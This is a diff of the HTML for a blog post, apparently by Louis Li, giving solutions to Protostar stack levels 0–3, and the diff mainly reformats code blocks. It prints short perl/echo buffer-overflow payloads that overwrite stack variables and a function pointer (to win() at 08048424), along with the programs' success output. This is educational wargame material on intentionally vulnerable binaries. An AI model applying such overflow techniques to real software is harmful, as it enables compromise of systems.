@@ -7,8 +7,16 @@
 	<meta name="author" content="Louis Li">
 
 	
-	<meta name="description" content="Protostar Stack Exploits (Solutions 0-3) Buffer overflow exploit exercises, part one. Overview
-Protostar is a series of exercises from Exploit &hellip;">
+	<meta name="description" content="
+
+
+
+
+
+	Protostar Stack Exploits (Solutions 0-3)
+        Buffer overflow exploit exercises, part one. 
+	Overview
+Protostar is a series of exercises ...">
 	
 
   <!-- http://t.co/dKP3o1e -->
@@ -114,34 +122,34 @@ Protostar is a series of exercises from Exploit &hellip;">
 <p>This is the first of three posts for Stack. The first four levels are straightforward, and their corresponding posts contain little explanation (solutions). The last three levels have more potential pitfalls, and those posts contain more detailed explanations (walkthroughs).</p>
 
 <h1 id="solutions">Solutions</h1>
-<p>## Stack: Level 0
-<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack0">full</a>): Overwrite a variable on the stack.</p>
+<h2 id="stack-level-0">Stack: Level 0</h2>
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack0">full</a>): Overwrite a variable on the stack.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> perl -e <span class="s2">&quot;print &#39;a&#39;x65&quot;</span> <span class="p">|</span> ./stack0
-<span class="go">you have changed the &#39;modified&#39; variable</span></code></pre></div>
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>perl <span class="nt">-e</span> <span class="s2">"print 'a'x65"</span> | ./stack0
+<span class="go">you have changed the 'modified' variable</span></code></pre></figure>
 
 <h2 id="stack-level-1">Stack: Level 1</h2>
 <p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack1">full</a>): Overwrite a variable on the stack with a specific series of hex values.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ./stack1 <span class="k">$(</span>perl -e <span class="s2">&quot;print &#39;a&#39;x64 . dcba&quot;</span><span class="k">)</span>
-<span class="go">you have correctly got the variable to the right value</span></code></pre></div>
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>./stack1 <span class="si">$(</span>perl <span class="nt">-e</span> <span class="s2">"print 'a'x64 . dcba"</span><span class="si">)</span>
+<span class="go">you have correctly got the variable to the right value</span></code></pre></figure>
 
 <!-- more -->
-<p>## Stack: Level 2
-<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack2">full</a>): Overwrite a variable by using an environmental variable.</p>
+<h2 id="stack-level-2">Stack: Level 2</h2>
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack2">full</a>): Overwrite a variable by using an environmental variable.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">export </span><span class="nv">GREENIE</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&quot;$(perl -e &quot;</span>print ax64<span class="s2">&quot;)\n\r\n\r&quot;</span><span class="k">)</span>
-<span class="gp">$</span> ./stack2
-<span class="go">you have correctly modified the variable</span></code></pre></div>
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">GREENIE</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="si">$(</span>perl <span class="nt">-e</span> <span class="s2">"print ax64"</span><span class="si">)</span><span class="se">\n\r\n\r</span><span class="s2">"</span><span class="si">)</span>
+<span class="gp">$</span><span class="w"> </span>./stack2
+<span class="go">you have correctly modified the variable</span></code></pre></figure>
 
 <h2 id="stack-level-3">Stack: Level 3</h2>
 <p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack3">full</a>): Overwrite a function pointer.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -d ./stack3 <span class="p">|</span> grep win
-<span class="go">08048424 &lt;win&gt;:</span>
-<span class="gp">$</span> <span class="nb">echo</span> -e <span class="s2">&quot;$(perl -e &quot;</span>print <span class="s1">&#39;a&#39;</span>x64<span class="s2">&quot;)\x24\x84\x04\x08&quot;</span> <span class="p">|</span> ./stack3
-<span class="go">calling function pointer, jumping to 08048424</span>
-<span class="go">code flow successfully changed</span></code></pre></div>
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>objdump <span class="nt">-d</span> ./stack3 | <span class="nb">grep </span>win
+<span class="gp">08048424 &lt;win&gt;</span>:
+<span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="si">$(</span>perl <span class="nt">-e</span> <span class="s2">"print 'a'x64"</span><span class="si">)</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">84</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08"</span> | ./stack3
+<span class="go">calling function pointer, jumping to 08048424
+code flow successfully changed</span></code></pre></figure>
 
 </div>
 
@@ -187,11 +195,11 @@ Protostar is a series of exercises from Exploit &hellip;">
 </div>
 			</div>
 			<footer id="footer" class="inner"><p>
-  Copyright &copy; 2020 - Louis Li -
-  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+  Copyright &copy; 2020 - Louis Li
 </p>
 
-Design credit: <a href="http://shashankmehta.in/archive/2012/greyshade.html">Shashank Mehta</a></footer>
+Theme originally by <a href="http://shashankmehta.in/archive/2012/greyshade.html">Shashank Mehta</a>
+</footer>
 			<script src="/javascripts/slash.js"></script>
 <script src="/javascripts/jquery.fancybox.pack.js"></script>
 <script type="text/javascript">
